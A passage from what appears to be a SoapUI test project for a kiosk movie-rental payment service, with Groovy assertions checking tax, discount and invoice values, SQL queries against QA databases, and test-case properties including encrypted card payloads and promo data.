def actualSalesTaxAmount = holder.getNodeValue("//SALESTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualShoppingCartType = holder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def actualRentalType = holder.getNodeValue("//RENTALTYPE[1]").toInteger();
def actualIsOffline = holder.getNodeValue("//ISOFFLINE[1]").toInteger();

//Get the expected values from TestCase properties; calculated in "Encoded Message Body (Authorize)"
def expectedRentalTaxAmount = context.expand( '${#TestCase#RentalTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxAmount = context.expand( '${#TestCase#PurchaseTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedRentalTaxRate = context.expand( '${#TestCase#RentalTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxRate = context.expand( '${#TestCase#PurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDigitalPurchaseTaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedGrandTotal = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDiscountedSubTotal = context.expand( '${#TestCase#DiscountedSubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSubTotal = context.expand( '${#TestCase#SubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPromotionValue = context.expand( '${#TestCase#PromoValue}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSalesTaxAmount = (expectedRentalTaxAmount + expectedPurchaseTaxAmount).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

//Validations
// rental type is 1 if online and 2 if offline (3 is web)
assert (actualRentalType == 1);
assert (actualIsOffline == 0);
assert (actualDiscountedSubTotal == expectedDiscountedSubTotal);
assert (actualGrandTotal == expectedGrandTotal);
assert (actualSubTotal == expectedSubTotal);
assert (actualAuthAmount == expectedGrandTotal);
assert (actualPromotionValue == expectedPromotionValue);
assert (actualSalesTaxAmount == expectedSalesTaxAmount);
//amounts will be 0 if there were none of that type
if (numRentals == 0) 
{
	assert actualRentalTaxAmount.toBigDecimal() == 0;
	assert actualRentalTaxRate == 0;
} 
else 
{
	assert actualRentalTaxAmount.toBigDecimal() == expectedRentalTaxAmount.toBigDecimal();
	assert actualRentalTaxRate == expectedRentalTaxRate;	
}
//amounts will be 0 if there were none of that type
if (numPurchases == 0) 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == 0;
	assert actualPurchaseTaxRate == 0;
} 
else 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == expectedPurchaseTaxAmount.toBigDecimal();
	if (HasPhysicalPurchase == 'true')
	{
		assert actualPurchaseTaxRate == expectedPurchaseTaxRate;
	}
	else
	{
		assert actualPurchaseTaxRate == expectedDigitalPurchaseTaxRate;
	}
	
}
// 1 = only rentals, 2 = only purchases, 3 = both
if (numRentals > 0 &amp;&amp; numPurchases == 0)
	assert actualShoppingCartType == 1
else if (numRentals == 0 &amp;&amp; numPurchases > 0)
	assert actualShoppingCartType == 2
else
	assert actualShoppingCartType == 3
	</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="6d8ac62a-fe7e-4618-977f-63861f2c2f20" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1b45fee-cd43-4f09-b272-367adbe8f895" name="Match content of [KIOSKCLIENT_ID]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/KIOSKCLIENT_ID[1]/text()</path><content>${#TestCase#KioskId}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="7eabeb33-e0ce-4abc-b36c-84e3b4b8e551" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);

assert (actualAmountBase == expectedAmountBase);</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="268115b3-052c-4f00-b2e3-dc206bdff4c2"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status], 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status] AS InvoiceItemStatus
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Invoice Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVOICEITEMSTATUS[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def grandTotal = tnxHolder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal();
//Get Credit Card Type
def CCType = context.expand( '${#TestCase#CCType}' ).toInteger();

if (grandTotal > 0)
{
	assert actualInvoiceItemStatus == 2
}
else
{
	assert actualInvoiceItemStatus == 16
}


//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if ((shoppingCartType == 2)||(shoppingCartType == 3)||(CCType == 6))
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Auth Completed" id="3e5f0c2e-4840-466f-8f70-731e482a8c5a"><con:settings/><con:config><script/></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983225</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058311</con:value></con:property><con:property><con:name>CCNumber</con:name><con:value>7777065480107268</con:value></con:property><con:property><con:name>CCType</con:name><con:value>6</con:value></con:property><con:property><con:name>DigitalpurchaseTaxAmt</con:name><con:value/></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value>1,2</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>1,1</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>DVDONME</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>1.50</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>purchasePayload</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>000150501,000027376</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies,Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD,Blu-ray</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>1.75,2.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>28.00,32.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>16,16</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : 1,  "Items" : [{"ProductId" : 986,"Barcode" : "000150501","VendStatus" : 28,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"DiscNumber" : null,"OfferCode" : null,"Pricing" : {"InitialNight" : 1.75,"ExtraNight" : 1.75,"NonReturn" : 28.00,"Expiration" : 1.75,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 1.75,"DefaultExtraNight" : 1.75},"BlurayUpsell" : null,"ItemSourceType" : 3},{"ProductId" : 400147,"Barcode" : "000027376","VendStatus" : 28,"ProductFamily" : "Movies","ProductType" : "Blu-ray","MultiDisc" : false,"DiscNumber" : null,"OfferCode" : null,"Pricing" : {"InitialNight" : 2.00,"ExtraNight" : 2.00,"NonReturn" : 32.00,"Expiration" : 2.00,"NonReturnDays" : 16,"PriceSetId" : 1,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 2.00,"DefaultExtraNight" : 2.00},"BlurayUpsell" : null,"ItemSourceType" : 3}],"Totals" : { "TaxRate" : 9.7500,"Subtotal" : 3.75 ,"DiscountedSubtotal" : 0.5,"TaxAmount" : 0.04875,"GrandTotal" : 0.54875} }</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>authRequestBody</con:name><con:value/></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value>0.04875</con:value></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>0.55</con:value></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value>0.5</con:value></con:property><con:property><con:name>SubTotal</con:name><con:value>3.75</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value/></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>986,400147</con:value></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value>400147</con:value></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value>2.00</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22GCAuthorize%22%2C%22MessageId%22%3A+%22a17f1f23-2003-4d5c-934a-c5e3b41ca16a%22%2C%22EngineVersion%22%3A+%221.27.1.297%22%2C%22BundleVersion%22%3A+%222.27.1.65%22%2C%22KioskId%22%3A+1505%2C%22CustomerProfileNumber%22%3A+%2275527813105188%22%2C%22PropertyBag%22%3A+%7B+%22EarlyIdIndicator%22%3A%22true%22+%7D%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22hnrCs9ffakBeWpRoL8igs3N4pXwFNmEAQzWoOvMZZ7MKd%2Bhm1npsRQBuEATGG2wUVYN8NjLTW2VOYcMytfR%2B7iWtB4CjnE3xctffX%2F5HZzGRkBbWPNW4n%2FMV7FgaMzvQWydaHY6375XzhDtGv7vhvbr7y2ndVZK63eakKwCcxd0VDEEhk9Mg8GOwfLrzDTSmjZm0Tr5BnhTTjTRSLsxtSztCVmazWlW4jSVw%2Fg8mvlrbRVdqcnYMzqL0qXY8TBJPcHyckMNmwoBqnxMTv8%2BZdzVi15sxsIX8NxdUbtpwkqa3B2HVXsXEQB2KY8NhKIS8EJ%2BVxf5nw6EmWBD1G70qNz30gVIlfSpLi1WOe7txVEpMoI3rymdb0FuM%2FxU0YDxbNE1EDA1Ku9%2FiQWVov4QnnqxXLM8Z5BM0tURDj3go3rpEARUsNt%2Ft4AaVcmMMn%2BnnHcoDX%2FiR%2FQ7Jd%2BOVFDGA9j607MDfyJlzByIxpV0xNE8KmU2ibh0Ja3sbOZIzprjBQqDeX9g%2F2pof4bZVwsfpnqWL5IrcpZGKvI%2Bs5kYKJHnXayezgRhYr%2Bh2MvGLpli6T%2F2TifY9ZpNX%2FEZZBfqPQ5QnVcsvm9TaWoRELDSIR2k5XAYD%2B5vEU4pAA4WlzdHhR6NSUuVNVtUldyKsnUvmePQD5vM4zzZRv2dN4mMppfU%3D%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22LRmLgUrE3rZdtiY%2Bh0thaUhD9TZPJK5tMdxGDrZ7d8Y%3D%22%2C%22LastFour%22%3A+%227268%22%2C%22CardType%22%3A+6%2C%22Track2%22%3A+%22Io1PisHv1i1UM%2FJxSFY8AyrGWMnI1OD4OB7Aqcb69YKmNohPuJyrOGO2QL739%2Bp6sLm4YlcUhte2ooRtfZ5sCaktjA7VWxvu9CnbjKqJ8cx2KFf8Ur6DxIhmRl1Gs2e38%2By9NnlSGamHRWwRg2VzhQ7t1Bnjk632GrG8Z4DiZy1QwjacQ44%2F9fcI%2F1wANXjSGake61UISVYLBcCKYXvv13wdjJ6An5x7z%2Fcld9hl0X7v3crHFIrw3WGARskzyqNgb6AWrH7YCsZMhNhSeYNXcdr19DSu6fSGpoeShTw8YKA4z1DmCmiPZNzhWCwOP098GRbya7AVcEcQJ8j5VICKHfckQwrqz33ouZKV1Exfg8wYMMEkQKjbND49Af0iEHGeCRKfuDxY9CAF%2BMa58xM%2F4c6At42qm8zcVdN34k%2BH1tPkanccT4LGlElrymdMBRJ%2FYwlHnYQRWeSZnXGHToHqMimhPfw%2Bz6%2Fj1uPO9Q6zhY%2FZkg2lCC1yL5KrLKj6dy32G2CJMibZkXtQtMaxXWAGIIv8uoTHy5ttbIWUv0bZ%2B8wu2PjaptOwlgneq5a8jpjuoCx4bu6lgEExvYgQ9ZR0ps2GcxguqgYRJ925eBO663tYS%2Bp%2F%2Frwl6nOpOQmN819X1RWITWnhU%2F7jTc%2B2e6Tx%2BmP5fal%2BV0yEXhu7BU3eNdU%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636814536252980000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-26T14%3A40%3A25.0000298%22%7D%2C%22UseCredits%22%3A+%22OptedOut%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+986%2C%22Barcode%22+%3A+%22000150501%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%2C%7B%22ProductId%22+%3A+400147%2C%22Barcode%22+%3A+%22000027376%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22Blu-ray%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+2.00%2C%22ExtraNight%22+%3A+2.00%2C%22NonReturn%22+%3A+32.00%2C%22Expiration%22+%3A+2.00%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+1%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+2.00%2C%22DefaultExtraNight%22+%3A+2.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%5D%2C%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C%22Subtotal%22+%3A+3.75+%2C%22DiscountedSubtotal%22+%3A+0.5%2C%22TaxAmount%22+%3A+0.04875%2C%22GrandTotal%22+%3A+0.54875%7D+%7D%5D%2C%22Discounts%22%3A+%5B%7B%22ProductId%22%3A+986%2C%22DiscountType%22%3A+%22Loyalty%22%2C%22PromotionCode%22%3A+null%2C%22RedemptionPoints%22%3A+1500%2C%22Amount%22%3A+1.75%7D%2C%7B%22ProductId%22%3A+400147%2C%22DiscountType%22%3A+%22PromotionCode%22%2C%22PromotionCode%22%3A+%22DVDONME%22%2C%22PromotionCodeValue%22%3A+%221.50%22%2C%22PromotionIntentCode%22%3A+7%2C%22Amount%22%3A+1.5%7D%5D%7D%7D+</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>75527813105188</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value>1</con:value></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value>1.75</con:value></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value>986</con:value></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountPayload</con:name><con:value>{"ProductId": 986,"DiscountType": "Loyalty","PromotionCode": null,"RedemptionPoints": 1500,"Amount": 1.75},{"ProductId": 400147,"DiscountType": "PromotionCode","PromotionCode": "DVDONME","PromotionCodeValue": "1.50","PromotionIntentCode": 7,"Amount": 1.5}</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "hnrCs9ffakBeWpRoL8igs3N4pXwFNmEAQzWoOvMZZ7MKd+hm1npsRQBuEATGG2wUVYN8NjLTW2VOYcMytfR+7iWtB4CjnE3xctffX/5HZzGRkBbWPNW4n/MV7FgaMzvQWydaHY6375XzhDtGv7vhvbr7y2ndVZK63eakKwCcxd0VDEEhk9Mg8GOwfLrzDTSmjZm0Tr5BnhTTjTRSLsxtSztCVmazWlW4jSVw/g8mvlrbRVdqcnYMzqL0qXY8TBJPcHyckMNmwoBqnxMTv8+ZdzVi15sxsIX8NxdUbtpwkqa3B2HVXsXEQB2KY8NhKIS8EJ+Vxf5nw6EmWBD1G70qNz30gVIlfSpLi1WOe7txVEpMoI3rymdb0FuM/xU0YDxbNE1EDA1Ku9/iQWVov4QnnqxXLM8Z5BM0tURDj3go3rpEARUsNt/t4AaVcmMMn+nnHcoDX/iR/Q7Jd+OVFDGA9j607MDfyJlzByIxpV0xNE8KmU2ibh0Ja3sbOZIzprjBQqDeX9g/2pof4bZVwsfpnqWL5IrcpZGKvI+s5kYKJHnXayezgRhYr+h2MvGLpli6T/2TifY9ZpNX/EZZBfqPQ5QnVcsvm9TaWoRELDSIR2k5XAYD+5vEU4pAA4WlzdHhR6NSUuVNVtUldyKsnUvmePQD5vM4zzZRv2dN4mMppfU=","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "LRmLgUrE3rZdtiY+h0thaUhD9TZPJK5tMdxGDrZ7d8Y=","LastFour": "7268","CardType": 6,"Track2": "Io1PisHv1i1UM/JxSFY8AyrGWMnI1OD4OB7Aqcb69YKmNohPuJyrOGO2QL739+p6sLm4YlcUhte2ooRtfZ5sCaktjA7VWxvu9CnbjKqJ8cx2KFf8Ur6DxIhmRl1Gs2e38+y9NnlSGamHRWwRg2VzhQ7t1Bnjk632GrG8Z4DiZy1QwjacQ44/9fcI/1wANXjSGake61UISVYLBcCKYXvv13wdjJ6An5x7z/cld9hl0X7v3crHFIrw3WGARskzyqNgb6AWrH7YCsZMhNhSeYNXcdr19DSu6fSGpoeShTw8YKA4z1DmCmiPZNzhWCwOP098GRbya7AVcEcQJ8j5VICKHfckQwrqz33ouZKV1Exfg8wYMMEkQKjbND49Af0iEHGeCRKfuDxY9CAF+Ma58xM/4c6At42qm8zcVdN34k+H1tPkanccT4LGlElrymdMBRJ/YwlHnYQRWeSZnXGHToHqMimhPfw+z6/j1uPO9Q6zhY/Zkg2lCC1yL5KrLKj6dy32G2CJMibZkXtQtMaxXWAGIIv8uoTHy5ttbIWUv0bZ+8wu2PjaptOwlgneq5a8jpjuoCx4bu6lgEExvYgQ9ZR0ps2GcxguqgYRJ925eBO663tYS+p//rwl6nOpOQmN819X1RWITWnhU/7jTc+2e6Tx+mP5fal+V0yEXhu7BU3eNdU="},</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>1.75</con:value></con:property><con:property><con:name>RedemptionPoints</con:name><con:value>1750</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>HasUpsell</con:name><con:value>false</con:value></con:property><con:property><con:name>UpsellOffer</con:name><con:value/></con:property><con:property><con:name>UpsellOfferStatus</con:name><con:value/></con:property><con:property><con:name>UpsellTypeId</con:name><con:value>1,1</con:value></con:property><con:property><con:name>ProductGroupId</con:name><con:value>0,0</con:value></con:property><con:property><con:name>AppliedPromoValue</con:name><con:value>1.5</con:value></con:property><con:property><con:name>DiscountAmountList</con:name><con:value>1.75,1.5</con:value></con:property><con:property><con:name>RemainingPromoValue</con:name><con:value>0.00</con:value></con:property><con:property><con:name>HasOffer</con:name><con:value>false</con:value></con:property><con:property><con:name>RCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>rentalRCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>purchaseRCFlag</con:name><con:value/></con:property><con:property><con:name>BarcodeForTnx</con:name><con:value>000027376</con:value></con:property><con:property><con:name>ItemSourceType</con:name><con:value>0,0</con:value></con:property><con:property><con:name>AllBarcodes</con:name><con:value>000150501,000027376</con:value></con:property><con:property><con:name>MDVFlag</con:name><con:value/></con:property><con:property><con:name>MDVDiscNumber</con:name><con:value/></con:property><con:property><con:name>hasMDV</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>false,false</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>null,null</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="ResvAuth" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="39fe7f1a-289c-40c4-81f7-aa8105432707"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="b31a7d84-a959-46f5-85a0-c9ed3a4ea88f"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (ResvAuth)" id="c891af09-9d91-4d20-9e5b-08d3224d97f6"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.####"); //Rounding the amount to 2 decimals.

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
